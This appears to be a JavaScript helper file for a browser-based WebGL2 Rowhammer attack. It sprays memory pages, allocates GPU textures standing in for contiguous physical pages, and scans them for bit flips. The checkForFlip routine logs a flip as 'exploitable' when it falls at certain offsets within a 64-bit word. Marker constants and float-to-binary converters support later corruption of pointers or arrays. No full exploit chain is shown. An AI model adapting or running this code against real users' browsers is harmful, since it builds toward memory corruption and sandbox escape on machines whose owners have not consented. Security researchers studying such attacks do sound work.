// Global vars
KB = 1024;
MB = KB * KB
KB4 = KB * 4;
PAGE_TEXTURE_W = 32;
PAGE_TEXTURE_H = 32;
MIN_CONTIMUOUS_PAGES = 64
ARRAY_UINT8_0 = createUint8Array(KB4, 0x00);
ARRAY_UINT8_1 = createUint8Array(KB4, 0xFF);
ARRAY_UINT8_READ_TEXTURE = createUint8Array(KB4);
PAGES_PER_MB = 256
SPAM_PAGES = []

INT_MARKER = 0x40414140
FIRST_ELEM = 0x50515150

function initGL() {
  const canvas = document.createElement('canvas');
  gl = canvas.getContext('webgl2');
  if (!gl) {
    console.log('-- No webgl2 for you!');
    throw new Error('-- WebGL2 not available!');
  }
  else {
    console.log('++ global gl object initialized');
  }
}

function initFramebuffer() {
  framebuffer = gl.createFramebuffer();
  gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffer);
  console.log('++ global framebuffer object initialized');
}

function createTexture2DRGBA(data, width, height) {
  const texture = gl.createTexture();
  gl.bindTexture(gl.TEXTURE_2D, texture);
  
  gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, width, height, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
  
  gl.bindTexture(gl.TEXTURE_2D, null);
  return texture;
}

function createUint8Array(elements, fill = 0x00) {
  const arr = new Uint8Array(elements);
  
  for (let i = 0; i < elements; i++) {
    arr[i] = fill;
  }
  return arr;
}

function viewFramebuffer() {
  var pixels = new Uint8Array(KB4);
  gl.readPixels(0, 0, PAGE_TEXTURE_W, PAGE_TEXTURE_H, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
  
  for (let i = 0; i <= KB4 - 4; i += 4) {
    console.log(`${pixels[i]},${pixels[i + 1]},${pixels[i + 2]},${pixels[i + 3]}  `);
  }
}

function initDebug() {
  const targetTexture = createTexture2DRGBA(null, PAGE_TEXTURE_W, PAGE_TEXTURE_H);
  
  // attach the texture as the first color attachment
  gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, targetTexture, 0);
  if (gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {
    throw new Error('Framebuffer not complete! - ' + gl.checkFramebufferStatus(gl.FRAMEBUFFER));
  }
  
  createRectangle();
}

function createRectangle() {
  const positionBuffer = gl.createBuffer();
  gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
  // draw 2 triangles
  const positions = [
    1, 1,   // top right
    1, -1,  // bottom right
    -1, -1,  // bottom left
    
    -1, -1,  // bottom left
    -1, 1,   // top left
    1, 1,   // top right
  ];
  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW);
  
  const vao = gl.createVertexArray();
  gl.bindVertexArray(vao);
  
  gl.vertexAttribPointer(0, 2, gl.FLOAT, false, 0, 0);
  gl.enableVertexAttribArray(0);
}

function checkForFlip(texture) {
  // attach the texture as the first color attachment
  console.log(`++ Checking for bitflips.`)
  gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture, 0);
  if (gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {
    throw new Error('Framebuffer not complete! - ' + gl.checkFramebufferStatus(gl.FRAMEBUFFER));
  }
  
  var pixels = ARRAY_UINT8_READ_TEXTURE;
  gl.readPixels(0, 0, PAGE_TEXTURE_W, PAGE_TEXTURE_H, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
  for (let i = 0; i < KB4; i++) {
    if(pixels[i] != 0xFF) {
      console.log(`++++ BIT FLIP IDENTIFIED`);
      console.log(`+++ Value: ${pixels[i].toString(16)}, byte offset: ${i}, 64-bit offset: ${i % 8}`);
      if ((i % 8) > 4) {
        console.log('++++ BIT FLIP EXPLOITABLE');
        return true;
      }
    }
  }
  return false;
}

function fillTexture(texture, fill=0x00) {
  let data;
  if (fill == 0x00) {
    data = ARRAY_UINT8_0;
  } else if(fill == 0xFF) {
    data = ARRAY_UINT8_1;
  } else {
    data = createUint8Array(KB4, fill);
  }
  
  // write special values to texture
  gl.bindTexture(gl.TEXTURE_2D, texture);
  gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, PAGE_TEXTURE_W, PAGE_TEXTURE_H, gl.RGBA, gl.UNSIGNED_BYTE, data);
  gl.bindTexture(gl.TEXTURE_2D, null);
}

function createUint32Array(elements, fill=0x00000000) {
  const arr = new Uint32Array(elements);
  
  for(let i=0; i<elements; i++) {
    arr[i] = fill;
  }
  return arr;
}

function allocatePage() {
  let page = createUint32Array(KB4, 1)
  window.SPAM_PAGES.push(page)
}

function allocatePointerArrayPage() {
  let page = []
  for (let i = 0; i < KB4/8; i++) {
    page.push("ThisIsAPointer")
  }
}

function fill_arrays(arr, len) {
  for (var i = 0; i < len; i++) {
    arr[i] = INT_MARKER;
  }
  arr[0] = FIRST_ELEM;
}


function allocatePages(pages) {
  console.log(`++ Bulk allocating ${pages} pages | ${pages*KB4 / MB} MB of memory `)
  for (let i = 0; i < pages; i++) {
    allocatePage()
  }
}

function mockContPages(count) {
  let blocks = [];
  for (let i = 0; i < count; i++) {
    let block = [];
    for (let j = 0; j < 64; j++) {
      block.push({ texture: createTexture2DRGBA(createUint8Array(KB4, j), PAGE_TEXTURE_W, PAGE_TEXTURE_H) });
    }
    blocks.push(block);
  }
  return blocks
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function xNumber(num, gap) {
  let f = new Float64Array(1)
  f[0] = num
  let ua = new Uint8Array(f.buffer).reverse()
  // let v = new DataView(f.buffer) could also be used
  let ret = ''
  for (let i = 0 ; i < ua.byteLength; i++) {
    ret += ua[i].toString(16)
  }

  return gap ? `0x${ret.substr(0, 8)} ${ret.substr(8, 16)}` : `0x${ret}`
}

// IIFE to scope internal variables
var float64ToInt64Binary = (function () {
  // create union
  var flt64 = new Float64Array(1)
  var uint16 = new Uint16Array(flt64.buffer)
  // 2**53-1
  var MAX_SAFE = 9007199254740991
  // 2**31
  var MAX_INT32 = 2147483648
  
  function uint16ToBinary() {
    var bin64 = ''
    
    // generate padded binary string a word at a time
    for (var word = 0; word < 4; word++) {
      bin64 = uint16[word].toString(2).padStart(16, 0) + bin64
    }
    
    return bin64
  }
  
  return function float64ToInt64Binary(number) {
    // NaN would pass through Math.abs(number) > MAX_SAFE
    // if (!(Math.abs(number) <= MAX_SAFE)) {
    //   throw new RangeError('Absolute value must be less than 2**53')
    // }
    
    var sign = number < 0 ? 1 : 0
    
    // shortcut using other answer for sufficiently small range
    if (Math.abs(number) <= MAX_INT32) {
      return (number >>> 0).toString(2).padStart(64, sign)
    }
    
    // little endian byte ordering
    flt64[0] = number
    
    // subtract bias from exponent bits
    var exponent = ((uint16[3] & 0x7FF0) >> 4) - 1022
    
    // encode implicit leading bit of mantissa
    uint16[3] |= 0x10
    // clear exponent and sign bit
    uint16[3] &= 0x1F
    
    // check sign bit
    if (sign === 1) {
      // apply two's complement
      uint16[0] ^= 0xFFFF
      uint16[1] ^= 0xFFFF
      uint16[2] ^= 0xFFFF
      uint16[3] ^= 0xFFFF
      // propagate carry bit
      for (var word = 0; word < 3 && uint16[word] === 0xFFFF; word++) {
        // apply integer overflow
        uint16[word] = 0
      }
      
      // complete increment
      uint16[word]++
    }
    
    // only keep integer part of mantissa
    var bin64 = uint16ToBinary().substr(11, Math.max(exponent, 0))
    // sign-extend binary string
    return bin64.padStart(64, sign)
  }
})()

function to64bitFloat(number) {
  var f = new Float64Array(1);
  f[0] = number;
  var view = new Uint8Array(f.buffer);
  var i, result = "";
  for (i = view.length - 1; i >= 0; i--) {
    var bits = view[i].toString(2);
    if (bits.length < 8) {
      bits = new Array(8 - bits.length).fill('0').join("") + bits;
    }
    result += bits + " ";
  }
  return result;
}